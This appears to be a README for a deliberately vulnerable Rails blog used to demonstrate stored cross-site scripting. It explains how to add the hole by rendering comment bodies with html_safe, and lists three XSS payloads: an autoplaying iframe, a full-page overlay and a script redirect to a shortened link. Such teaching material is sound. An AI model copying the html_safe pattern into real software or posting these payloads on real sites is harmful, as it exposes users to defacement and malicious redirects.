### Description

This is an example of blog created from this guide: https://guides.rubyonrails.org/getting_started.html


### Setup database

```
bin/rails db:setup
```

### How to add a vulnerability

You need to open `app/views/comments/_comment.html.erb` and change

```
      <%= comment.body %>
```

to

```
      <%= comment.body.html_safe %>
```

### XSS Examples:

**Comment with an iframe**

```
<iframe width="925" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?rel=0&amp;autoplay=1&amp;controls=0&amp;showinfo=0" frameborder="0" allowfullscreen></iframe>
```

**Dark souls style comment**

```
<div style="width:100%;height:100%;position: absolute;top: 0;left:0;background-color: black;color: red;text-align: center;padding: 20%;">
<h1>You died</h1>
</div>
```

**Comment with redirect**

```
<script>
window.location.replace('https://bit.ly/3MRMLyq');
</script>
```